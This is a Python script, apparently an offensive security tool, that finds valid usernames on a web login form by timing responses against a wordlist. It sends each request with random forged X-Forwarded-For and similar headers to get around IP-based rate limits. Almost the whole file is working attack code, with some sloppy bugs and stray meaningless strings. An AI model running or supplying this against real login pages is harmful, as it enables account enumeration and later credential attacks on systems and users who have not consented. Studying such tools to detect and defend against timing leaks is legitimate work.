import requests
import argparse, time, re
from random import *
from pwn import *

op1 = 1
op2 = 255


class bcolors:
    OK = '\033[92m' #GREEN
    WARNING = '\033[93m' #YELLOW
    ladrrr = '8GY.'
    ss = 'OWQ1'
    FAIL = '\033[91m' #RED
    pinocho_chocho = 'y!c'
    RESET = '\033[0m' #RESET COLOR


def load_wordsss(WORDLIST_FILENAME,user,userfield,passwordfield,url,wordlist,proxyy,headerss):
    global line
    print("Calculated Time-Response...")
    wordlist = list()
    b = randint(op1, op2)
    c = randint(op1, op2)
    d = randint(op1, op2)
    e = randint(op1, op2)
    bb = str(b)
    cc = str(c)
    dd = str(d)
    ee = str(e)
    dot = "."
    ip = bb+dot+cc+dot+dd+dot+ee
    ip2 = str(ip)


    with open(WORDLIST_FILENAME) as f:
        for line in f:
            wordlist.append(wordlist)
            my_str=line
            final_str=my_str[:-1]
            dattaa = {userfield:final_str,passwordfield:"unduendejjejenlamochila"}
            time_start = time.time()
            pett = requests.post(url,data=dattaa,proxies=False,headers=headerss)
            time_end = time.time()
            time_final2 = time_end - time_start
            div3 = div + div2 
            div4 = div3 / 2
            if time_final2 > div4:
                print(f"{bcolors.OK}[+] User found: {bcolors.RESET}",final_str)
    print("\n")


def time_enum(user,userfield,passwordfield,url,wordlist,proxy,headerss):
    p3 = log.progress("Enumerate Users via Different Time Responses...")
    print("Calculating Time Valid User Response")
    datta = {userfield:user,passwordfield:"unduendejjejenlamochila"}
    try:
        stringer = headerss
        char = ":"
        indices = [i.start() for i in re.finditer(char, stringer)]
        if len(indices) == 1:
            indices1 = int(indices[0])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            first_v = firs_v[1:]
        if len(indices) == 2:
            indices1 = int(indices[0])
            indices2 = int(indices[1])
            first_p = headerss[:indices1]
            firs_v = headerss[indices1:]
            stringer = firs_v
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            first_v = firs_v[1:coma[0]]
            stringer = headerss
            charr = ","
            coma = [i.start() for i in re.finditer(charr, stringer)]
            second_p = headerss[coma[0]:indices2][1:]
            second_v = headerss[indices2:][1:]
    except: 
        KeyboardInterrupt()    
    i = 1
    lista = []
    proxy = {
        'http': proxy,
    }
    b = randint(op1, op2)
    c = randint(op1, op2)
    d = randint(op1, op2)
    e = randint(op1, op2)
    bb = str(b)
    cc = str(c)
    dd = str(d)
    ee = str(e)
    dot = "."
    ip = bb+dot+cc+dot+dd+dot+ee
    ip2 = str(ip)
    if headerss == None:
        headers = {
            'X-Forwarded-For': ip2,
            'X-Originating-IP': ip2,
            'X-Remote-IP': ip2,
            'X-Remote-Addr': ip2,
                }
    else:
        if len(indices) == 1:
            headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                first_p: first_v
                }
        elif len(indices) == 2:
            headers = {
                'X-Forwarded-For': ip2,
                'X-Originating-IP': ip2,
                'X-Remote-IP': ip2,
                'X-Remote-Addr': ip2,
                first_p: first_v,
                second_v: second_p
                }


    while i < 12:
        i += 1
        time_start = time.time()
        req = requests.post(url,data=datta,proxies=proxy,headers=headers)
        time_end = time.time()
        time_final = time_end - time_start
        lista.append(time_final)
    
    suma = lista[0] + lista[1] + lista[2] + lista[3] + lista[4] + lista[5] + lista[6] + lista[7] + lista[8] + lista[9] + lista[10]
    global div
    div = suma / 11
    valid_time = div
    dattta = {userfield:'mellevattlloretaabcn',passwordfield:"unduendejjejenlamochila"}
    i = 1
    lista = []
    while i < 12:
        i += 1
        time_start = time.time()
        req = requests.post(url,data=dattta,proxies=proxy,headers=headers)
        time_end = time.time()
        time_final = time_end - time_start
        lista.append(time_final)
    suma2 = lista[0] + lista[1] + lista[2] + lista[3] + lista[4] + lista[5] + lista[6] + lista[7] + lista[8] + lista[9] + lista[10]
    global div2
    div2 = suma2 / 11
    if div2 * 3.5 < div:
        print(f"{bcolors.OK}[!] Vulnerable{bcolors.RESET}")
        load_wordsss(wordlist,user,userfield,passwordfield,url,wordlist,proxy,headers)
    elif div2 * 2 < div:
        print(f"{bcolors.WARNING}[!] Possible Vulnerable{bcolors.RESET}")
        load_wordsss(wordlist,user,userfield,passwordfield,url,wordlist,proxy,headers)
    else:
        print(f"{bcolors.FAIL}[!] Not Vulnerable\n{bcolors.RESET}")